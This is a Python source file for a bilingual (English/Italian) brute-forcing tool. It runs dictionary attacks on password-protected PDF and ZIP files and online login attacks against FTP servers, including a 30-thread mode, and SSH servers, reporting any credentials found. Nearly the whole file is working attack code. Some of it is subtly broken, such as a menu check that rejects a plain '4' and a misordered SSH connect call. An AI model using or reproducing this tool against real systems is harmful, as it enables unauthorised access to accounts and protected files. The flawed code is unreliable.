import sys, subprocess, pikepdf, zipfile, ftplib, queue, paramiko, time
from socket import *
from tqdm import tqdm
from colorama import Fore, init
from threading import Thread


def get_lang_and_mode(mode):
    with open("lang.txt","r") as lang_file:
        list_ = lang_file.readlines()
        language = list_[0]
        if mode == "":
            if len(list_) == 2:
                mode = list_[1]
            else:
                mode = "terminal"
        lang_list = list(language)
        if lang_list[-1] == "\n":
            lang_list.pop()
        language = "".join(lang_list)
        if len(list_) >= 2:
            mode = list_[1]
            with open("lang.txt","w") as lang_file:
                lang_file.write(language)
    return language, mode


def main():
    mode = ""
    language, mode = get_lang_and_mode(mode)
    # print(f"{language}, {mode}")
    loop = True
    while loop == True:
        # target IP address (should be a testing router/firewall)
        if language == "English":
            print("""CHOOSE ONE OF THE FOLLOWING OPTIONS:
            1. CRACK A PDF FILE;
            2. CRACK A ZIP FILE;
            3. BRUTE-FORCE AN FTP SERVER;
            4. BRUTE-FORCE AN SSH SERVER.""")
        else:
            print("""SCEGLI UNA DELLE SEGUENTI OPZIONI:
            1. CRACKARE UN FILE PDF;
            2. CRACKARE UN FILE ZIP;
            3. FARE UN BRUTE-FORCE CONTRO UN SERVER FTP;
            4. FARE UN BRUTE-FORCE CONTRO UN SERVER SSH.""")
        while True:
            if language == "English":
                choice = input("INSERT YOUR CHOICE: ")
            else:
                choice = input("INSERISCI LA TUA SCELTA: ")
            if choice == "1" or choice == "1.":
                pdf_cracker(language, mode)
                break
            elif choice == "2" or choice == "2.":
                zip_cracker(language, mode)
                break
            elif choice == "3" or choice == "3.":
                ftp_cracker(language, mode)
                break
            elif choice == "4." or choice == "4.":
                ssh_cracker(language, mode)
                break
            elif choice.lower() == "exit":
                if language == "English":
                    print("GOODBYE!\n")
                else:
                    print("ARRIVEDERCI!\n")
                loop = False
                break
            else:
                if language == "English":
                    print("YOU HAVE NOT ENTERED A VALID CHOICE!")
                else:
                    print("NON HAI INSERITO UNA SCELTA VALIDA!")
        if loop == True:
            while True:
                if language == "English":
                    exit_choice = input("DO YOU WANT TO EXIT THE PROGRAM? [Y/n]: ")
                else:
                    exit_choice = input("VUOI USCIRE DAL PROGRAMMA? [Y/n]: ")
                exit_choice = exit_choice.lower()
                if exit_choice == "y" or exit_choice == "yes":
                    if language == "English":
                        print("GOODBYE!\n")
                    else:
                        print("ARRIVEDERCI!\n")
                    loop = False
                    break
                elif exit_choice != "n" or exit_choice != "no":
                    if language == "English":
                        print("RETURNING TO THE MENU!\n")
                    else:
                        print("RITORNO AL MENÙ!\n")
                    if mode == "menu":
                        with open("lang.txt", "a") as lang_file:
                            lang_file.write("\nmenu")
                        subprocess.Popen("brute-forcer.bat", shell=True)
                        sys.exit()
                    else:
                        break


def pdf_cracker(language, mode):
    if language == "English":
        pdf_file = input("Insert the name of the PDF file you want to crack --> ")
        password_file = input("Insert the name of the password list file --> ")
    else:
        pdf_file = input("Inserisci il nome del file PDF da crackare --> ")
        password_file = input("Inserisci il nome del file di elenco delle password --> ")
    passwords = [line.strip() for line in open(password_file)]
    for password in tqdm(passwords, "Decrypting PDF"):
        try:
            with pikepdf.open(pdf_file, password=password) as pdf_file:
                if language == "English":
                    print(f"[+] Password found: {password}")
                else:
                    print(f"[+] Password trovata: {password}")
        except pikepdf._qpdf.PasswordError as e:
            continue


def zip_cracker(language, mode):
    if language == "English":
        zip_file = input("Insert the name of the ZIP file you want to crack --> ")
        password_file = input("Insert the name of the password list file --> ")
    else:
        zip_file = input("Inserisci il nome del file ZIP da crackare --> ")
        password_file = input("Inserisci il nome del file con la lista di password da provare --> ")
    passwords = [line.strip() for line in open(password_file)]
    zip_file = zipfile.ZipFile(zip_file)
    num_of_pass = len(list(open(password_file, "rb")))
    if language == "English":
        print(f"Total of passwords to test: {num_of_pass}")
    else:
        print(f"Password totali da testare: {num_of_pass}")
    with open(password_file, "rb") as password_file:
        for password in tqdm(password_file, total=num_of_pass, unit="word"):
            try:
                zip_file.extractall(pwd=password.strip())
            except:
                continue
            else:
                if language == "English":
                    print(f"[+] Password found: {password.decode().strip()}")
                else:
                    print(f"[+] Password trovata: {password.decode().strip()}")
                exit(0)
    if language == "English":
        print("[!] Password not found, try with another password list.")
    else:
        print("[!] Password non trovata, prova con un'altra lista di password")


def ftp_cracker(language, mode):
    init()
    if language == "English":
        host = input("Insert IP address of the FTP server --> ")
        port = input("Insert the port of the FTP server --> ")
        username = input("Insert the username of the FTP server --> ")
        password_file = input("Insert the name of the password list file --> ")
        choice = input("Do you want to use the simple cracker (1) or the threaded cracker (2)? --> ")
    else:
        host = input("Inserisci l'indirizzo IP del server FTP --> ")
        port = input("Inserisci la porta del server FTP --> ")
        username = input("Inserisci lo username del server FTP --> ")
        password_file = input("Inserisci il nome del file con la lista di password da provare --> ")
        choice = input("Vuoi usare il cracker semplice (1) o il cracker threaded (2)? --> ")
    if choice == "1" or choice == "1.":
        passwords = open(password_file).read().split("\n")
        if language == "English":
            print(f"Total of passwords to test: {len(passwords)}")
        else:
            print(f"Totale di password da testare: {len(passwords)}")
        for password in passwords:
            if is_correct(username, password, host, port, language):
                break
    elif choice == "2" or choice == "2.":
        q = queue.Queue()
        n_threads = 30
        passwords = open(password_file).read().split("\n")
        if language == "English":
            print(f"Total of passwords to test: {len(passwords)}")
        else:
            print(f"Totale di password da testare: {len(passwords)}")
        for password in passwords:
            q.put(password)
        for t in range(n_threads):
            thread = Thread(target=lambda:threaded_ftp_cracker(q, host, port, username, language))
            thread.daemon = True
            thread.start()
        q.join()


def is_correct(username, password, host, port, language):
    server = ftplib.FTP()
    print(f"[+] Trying {password}")
    try:
        server.connect(host, port, timeout=5)
        server.login(username, password)
    except ftplib.error_perm:
        return False
    else:
        print(f"{Fore.GREEN}[+] Found credentials:", password, Fore.RESET)
        return True


def threaded_ftp_cracker(q, host, port, username, language):
    while True:
        password = q.get()
        server = ftplib.FTP()
        if language == "English":
            print(f"[!] Trying {password}")
        else:
            print(f"[!] Provando {password}")
        try:
            server.connect(host, port, timeout=5)
            server.login(username, password)
        except ftplib.error_perm:
            pass
        else:
            print(f"{Fore.GREEN}[+] Found credentials:")
            print(f"{Fore.GREEN}\thost: {host}")
            print(f"{Fore.GREEN}\tusername: {username}")
            print(f"{Fore.GREEN}\tpassword: {password}")
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            q.task_done()


def ssh_cracker(language, mode):
    if language == "English":
        choice = input("Do you want to insert a hostname (1) or a IP address (2)? --> ")
    else:
        choice = input("Vuoi inserire il nome di un host (1) o un indirizzo IP (2)? --> ")
    if choice == "1" or choice == "1.":
        if language == "English":
            hostname = input("Insert the hostname of the SSH server to attack --> ")
        else:
            hostname = input("Inserisci il nome dell'host del server SSH da attaccare --> ")
        host = gethostbyname(hostname)
    elif choice == "2" or choice == "2.":
        if language == "English":
            host = input("Insert the IP address of the SSH server to attack --> ")
        else:
            host = input("Inserisci l'indirizzo IP del server SSH da attaccare --> ")
    else:
        if language == "English":
            print("You have not entered a valid choice!")
        else:
            print("Non hai inserito una scelta valida!")
    if language == "English":
        username = input("Insert the username of the account to attack --> ")
        password_file = input("Insert the name of the password list file --> ")

    else:
        username = input("Inserisci lo username dell'account da attaccare --> ")
        password_file = input("Inserisci il nome del file con la lista di password da provare --> ")
    passwords = open(password_file).read().split("\n")
    if language == "English":
        print(f"Total of passwords to test: {len(passwords)}")
    else:
        print(f"Totale di password da testare: {len(passwords)}")
    for password in passwords:
        if is_ssh_open(host, username, password, language):
            break


def is_ssh_open(host, username, password, language):
    init()
    GREEN = Fore.GREEN
    RED   = Fore.RED
    RESET = Fore.RESET
    BLUE  = Fore.BLUE
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username, password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host: {host} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(60)
        return is_ssh_open(host, username, password, language)
    else:
        print(f"{GREEN}[+] Found combo:")
        print(f"{GREEN}\thost: {host}")
        print(f"{GREEN}\tusername: {username}")
        print(f"{GREEN}\tpassword: {password}")
        return True


if __name__ == "__main__":
    main()
